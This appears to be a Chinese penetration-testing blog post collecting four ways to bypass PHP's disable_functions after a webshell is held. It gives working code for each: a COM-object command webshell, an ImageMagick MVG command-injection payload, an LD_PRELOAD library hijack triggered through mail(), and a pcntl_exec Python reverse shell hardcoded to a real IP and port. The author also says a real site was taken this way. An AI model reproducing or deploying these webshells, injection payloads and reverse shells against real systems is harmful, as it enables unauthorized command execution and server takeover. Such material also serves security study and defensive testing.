@@ -1,0 +1,154 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h3 data-content="1" id="01fe9a8ea8e50ccdbeac60e7c7d1878c">前言</h3>
+<p>在渗透测试中，会遇到自己有shell，但是不能执行命令不能提权等情况，我就把最近搞战中遇到的突破disable_function的方法（都是一些大佬研究出来，先感谢一波）总结与复现了一下，这些方法面试也经常会问</p>
+<h3 data-content="1" id="853bcbbd0d07d03a18f693d71d45801a">一.系统组件绕过</h3>
+<p>window com组件(php 5.4)(高版本扩展要自己添加）<br/>
+条件：要在php.ini中开启（如图）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531163500-fad14268-837e-1.png"/></p>
+<p>利用代码，利用shell上传如下代码到目标服务器上</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$command</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">];</span>
+<span class="nv">$wsh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">COM</span><span class="p">(</span><span class="s1">'WScript.shell'</span><span class="p">);</span> <span class="c1">// 生成一个COM对象　Shell.Application也能</span>
+<span class="nv">$exec</span> <span class="o">=</span> <span class="nv">$wsh</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s2">"cmd /c "</span><span class="o">.</span><span class="nv">$command</span><span class="p">);</span> <span class="c1">//调用对象方法来执行命令</span>
+<span class="nv">$stdout</span> <span class="o">=</span> <span class="nv">$exec</span><span class="o">-&gt;</span><span class="na">StdOut</span><span class="p">();</span>
+<span class="nv">$stroutput</span> <span class="o">=</span> <span class="nv">$stdout</span><span class="o">-&gt;</span><span class="na">ReadAll</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nv">$stroutput</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>利用成功后的结果<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531163853-8587f852-837f-1.png"/></p>
+<h4 data-content="1" id="65bff27cc5db03377951036fe976f509">二.利用ImageMagick漏洞绕过disable_function</h4>
+<p>ImageMagick是一套功能强大、稳定而且开源的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件，如果phpinfo中看到有这个，可以尝试如下利用</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531164055-ce1888a2-837f-1.png"/></p>
+<p>利用代码如下</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s2">"Disable Functions: "</span> <span class="o">.</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">'disable_functions'</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+
+<span class="nv">$command</span> <span class="o">=</span> <span class="nx">PHP_SAPI</span> <span class="o">==</span> <span class="s1">'cli'</span> <span class="o">?</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$command</span> <span class="o">==</span> <span class="s1">''</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$command</span> <span class="o">=</span> <span class="s1">'id'</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$exploit</span> <span class="o">=</span> <span class="s">&lt;&lt;&lt;</span><span class="dl">EOF</span><span class="s"></span>
+<span class="s">push graphic-context</span>
+<span class="s">viewbox 0 0 640 480</span>
+<span class="s">fill 'url(https://example.com/image.jpg"|$command")'</span>
+<span class="s">pop graphic-context</span>
+<span class="dl">EOF</span><span class="p">;</span>
+
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"KKKK.mvg"</span><span class="p">,</span> <span class="nv">$exploit</span><span class="p">);</span>
+<span class="nv">$thumb</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Imagick</span><span class="p">();</span>
+<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">readImage</span><span class="p">(</span><span class="s1">'KKKK.mvg'</span><span class="p">);</span>
+<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">writeImage</span><span class="p">(</span><span class="s1">'KKKK.png'</span><span class="p">);</span>
+<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">clear</span><span class="p">();</span>
+<span class="nv">$thumb</span><span class="o">-&gt;</span><span class="na">destroy</span><span class="p">();</span>
+<span class="nb">unlink</span><span class="p">(</span><span class="s2">"KKKK.mvg"</span><span class="p">);</span>
+<span class="nb">unlink</span><span class="p">(</span><span class="s2">"KKKK.png"</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<h3 data-content="1" id="8d988a4104e2a0a195c9902cef363a18">三.利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令</h3>
+<p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的</p>
+<h4 data-content="1" id="617b463ede409a32871d39c4150a4301">利用原理</h4>
+<p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
+<p>可能这个不好理解，我们做一个简单的测试代码</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
+<span class="kt">char</span> <span class="n">passwd</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"password"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"usage: %s &lt;password&gt;/n"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Correct Password!/n"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"Invalid Password!/n"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp"># 保存为a.c，并编译为a</span>
+</pre></div>
+<p>保存如上代码为a.c，并编译为a,编译命令如下</p>
+<blockquote>
+<p>gcc a.c -o a</p>
+</blockquote>
+<p>运行a结果如下<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531165011-19a41c2c-8381-1.png"/></p>
+<p>以上程序很简单，根据判断传入的字符串是否等于”password”，得出两种不同结果。 其中用到了标准C函数strcmp函数来做比较，这是一个外部调用函数，我们来重新编写一个同名函数,代码如下(保存如下代码为b.c)</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">strcmp</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s2</span><span class="p">){</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"hack functio  n invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n"</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s2</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>我们编译以上代码为一个动态共享库，编译命令如下</p>
+<blockquote>
+<p>gcc -fPIC -shared b.c -o b.so</p>
+</blockquote>
+<p>通过LD_PRELOAD来设置它能被其他调用它的程序优先加载</p>
+<blockquote>
+<p>export LD_PRELOAD="./b.so"</p>
+</blockquote>
+<p>我们再次运行a<br/>
+./a bbb<br/>
+Correct Password!</p>
+<p>我们看到随意输入字符串都会显示密码正确，这说明程序在运行时优先加载了我们自己编写的程序。这也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过LD_PRELOAD来设置它优先加载我们自己编写的程序，实现劫持。</p>
+<h5 data-content="1" id="de79bedf47c8dc9cb9de895a448fd255">结合mail 函数进行实战测试</h5>
+<p>那么我们来看一下sendmail函数都调用了哪些库函数，使用readelf -Ws /usr/sbin/sendmail命令来查看，我们发现sendmail函数在运行过程动态调用了很多标准库函数：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531165654-09f5372e-8382-1.png"/></p>
+<h5 data-content="1" id="78a092de4134c608d9ba1ac3acbe0856">构造poc思路</h5>
+<p>编制我们自己的动态链接程序。 通过php的putenv来设置LD_PRELOAD，让我们的程序优先被调用。 在webshell上用mail函数发送一封邮件来触发。具体实现如下</p>
+<p>1.编制我们自己的动态链接程序，代码如下（功能是执行mkdir test）<br/>
+执行编译为一个动态共享库的命令如下</p>
+<blockquote>
+<p>gcc -c -fPIC a.c -o a<br/>
+gcc -shared a -o a.so</p>
+</blockquote>
+<p>代码</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span> <span class="nf">payload</span><span class="p">(){</span>
+         <span class="kt">FILE</span><span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/tmp/2.txt"</span><span class="p">,</span><span class="s">"w"</span><span class="p">);</span>
+         <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+         <span class="n">system</span><span class="p">(</span><span class="s">"mkdir /var/www/html/test"</span><span class="p">);</span>
+ <span class="p">}</span>
+
+
+<span class="kt">int</span> <span class="nf">geteuid</span><span class="p">(){</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp1</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">"/tmp/2.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="n">fp1</span><span class="o">!=</span><span class="nb">NULL</span><span class="p">)</span>
+  <span class="p">{</span>
+   <span class="n">fclose</span><span class="p">(</span><span class="n">fp1</span><span class="p">);</span>
+         <span class="k">return</span> <span class="mi">552</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+         <span class="n">payload</span><span class="p">();</span>
+         <span class="k">return</span> <span class="mi">552</span><span class="p">;</span>
+       <span class="p">}</span>
+
+
+<span class="p">}</span>
+</pre></div>
+<p>2.利用webshell，上传编译后的a.so到目标服务器<br/>
+3.通过putenv来设置LD_PRELOAD，让我们的程序优先被调用。在webshell上用mail函数发送一封邮件来触发。利用代码如下</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+   <span class="nb">putenv</span><span class="p">(</span><span class="s2">"LD_PRELOAD=/var/www/html/a.so"</span><span class="p">);</span>
+   <span class="nb">mail</span><span class="p">(</span><span class="s2">"[email protected]"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="s2">""</span><span class="p">);</span>
+  <span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>结果如下，成功执行命令，创建文件test</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531170751-91a13712-8383-1.png"/></p>
+<h3 data-content="1" id="9739138d217682f3affdb76d001cc6cc">四.利用pcntl_exec突破disable_functions</h3>
+<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。(与python结合反弹shell) pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP 4 &gt;= 4.2.0, PHP 5</p>
+<p>利用代码如下</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>  <span class="nb">pcntl_exec</span><span class="p">(</span><span class="s2">"/usr/bin/python"</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">'-c'</span><span class="p">,</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect(("132.232.75.90",9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span><span class="p">));</span><span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>曾经就有一个网站是如此拿下的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531171055-fedc768e-8383-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190531171152-212aeaf4-8384-1.png"/></p>
+<h3 data-content="1" id="f26887548194ea42cf3d3fee13a3c6bb">结尾</h3>
+<p>其实还有很多方法可以突破disable_function，在这里就不一一列举了，真实环境中遇到disable_function禁用函数的情况还是比较多，希望和一些大佬再聊聊，学更多好思路</p>
+</div>
+</div>
